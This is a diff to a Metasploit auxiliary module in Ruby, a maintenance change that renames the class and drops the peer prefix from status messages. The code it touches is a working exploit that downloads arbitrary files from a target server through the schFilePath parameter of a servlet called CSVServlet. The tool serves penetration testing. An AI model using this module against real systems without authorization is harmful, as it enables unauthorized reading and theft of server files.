@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -46,21 +46,21 @@ class Metasploit3 < Msf::Auxiliary
   def run
     # Create request
     begin
-      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
+      print_status("Downloading file #{datastore['FILEPATH']}")
       res = send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),
         'vars_get' => { 'schFilePath' => datastore['FILEPATH'] },
       })
     rescue Rex::ConnectionError
-      print_error("#{peer} - Could not connect.")
+      print_error("Could not connect.")
       return
     end
 
     # Show data if needed
     if res && res.code == 200
       if res.body.to_s.bytesize == 0
-        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
+        print_error("0 bytes returned, file does not exist or it is empty.")
         return
       end
       vprint_line(res.body.to_s)
@@ -73,9 +73,9 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      print_error("#{peer} - Failed to download file.")
+      print_error("Failed to download file.")
     end
   end
 end
